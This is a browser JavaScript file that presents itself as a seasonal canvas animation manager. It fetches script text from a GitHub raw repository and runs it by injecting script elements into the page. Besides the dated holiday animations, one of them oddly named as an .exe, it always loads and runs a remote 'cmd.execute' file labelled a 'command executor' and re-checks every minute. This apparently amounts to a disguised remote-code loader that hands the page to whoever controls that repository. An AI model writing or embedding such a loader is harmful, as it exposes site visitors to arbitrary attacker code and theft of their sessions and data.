(function () {
    console.log("Canvas Manager initialized...");

    // Create and style the canvas
    var canvas = document.createElement("canvas");
    canvas.id = "canvas";
    document.body.appendChild(canvas);

    canvas.style.position = "fixed";
    canvas.style.top = "0";
    canvas.style.left = "0";
    canvas.style.zIndex = "10";
    canvas.style.pointerEvents = "none";
    canvas.style.width = "100%";
    canvas.style.height = "100%";

    // Function to dynamically load and execute a script
    function loadScript(url, description = "script") {
        console.log(`Attempting to load ${description} from ${url}`);
        return fetch(url)
            .then(response => {
                if (!response.ok) throw new Error(`Failed to load ${description}. HTTP status: ${response.status}`);
                return response.text();
            })
            .then(scriptContent => {
                console.log(`${description} loaded successfully.`);
                var script = document.createElement("script");
                script.text = scriptContent;
                document.body.appendChild(script);
                console.log(`${description} executed successfully.`);
            })
            .catch(error => {
                console.error(`Error loading ${description}:`, error);
            });
    }

    // JSON-like configuration for canvas animations
    var canvasSchedules = [
        {
            name: "Christmas Event",
            url: "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/snowy.canva",
            start: new Date(Date.UTC(new Date().getFullYear(), 11, 24, 0, 0)), // Dec 24, 00:00 UTC
            end: new Date(Date.UTC(new Date().getFullYear(), 11, 26, 23, 59)), // Dec 26, 23:59 UTC
            priority: 1 // Lower priority
        },
        {
            name: "New Year's Eve",
            url: "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/New_Years_Eve.exe.canva",
            start: new Date(Date.UTC(new Date().getFullYear(), 11, 31, 20, 0)), // Dec 31, 20:00 UTC
            end: new Date(Date.UTC(new Date().getFullYear() + 1, 0, 1, 3, 0)), // Jan 1, 03:00 UTC
            priority: 2 // Higher priority
        }
    ];

    // Function to find the appropriate canvas animation based on current time and priority
    function getCurrentCanvas() {
        var now = new Date();
        console.log("Checking current time:", now.toISOString());

        // Filter schedules to find active ones
        var activeSchedules = canvasSchedules.filter(schedule => now >= schedule.start && now <= schedule.end);
        console.log("Active schedules:", activeSchedules.map(s => s.name));

        if (activeSchedules.length === 0) {
            console.log("No matching schedule found for the current time.");
            return null; // No animation should be active
        }

        // Sort by priority (higher priority first)
        activeSchedules.sort((a, b) => b.priority - a.priority);
        console.log(`Selected schedule: ${activeSchedules[0].name} (Priority: ${activeSchedules[0].priority})`);

        return activeSchedules[0].url; // Return the URL of the highest-priority active schedule
    }

    // Function to load and apply the appropriate canvas content
    function loadCanvasContent() {
        console.log("Loading canvas content...");

        var url = getCurrentCanvas();
        if (url) {
            console.log("Canvas content found, loading now...");
            loadScript(url, "canvas content");
        } else {
            console.log("No canvas content to load at this time.");
        }
    }

    // Function to periodically check for changes
    function startCanvasManager() {
        console.log("Starting canvas manager...");
        loadCanvasContent(); // Initial load

        // Check every minute for potential schedule changes
        setInterval(() => {
            console.log("Re-evaluating canvas schedule...");
            loadCanvasContent();
        }, 60000); // 60,000ms = 1 minute
    }

    // Load the additional command execution script
    function loadCommandExecutor() {
        console.log("Loading command executor script...");
        loadScript(
            "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/cmd.execute",
            "command executor"
        );
    }

    // Initialize everything
    function initialize() {
        console.log("Initializing Canvas Manager...");
        startCanvasManager();
        loadCommandExecutor();
    }

    initialize();
})();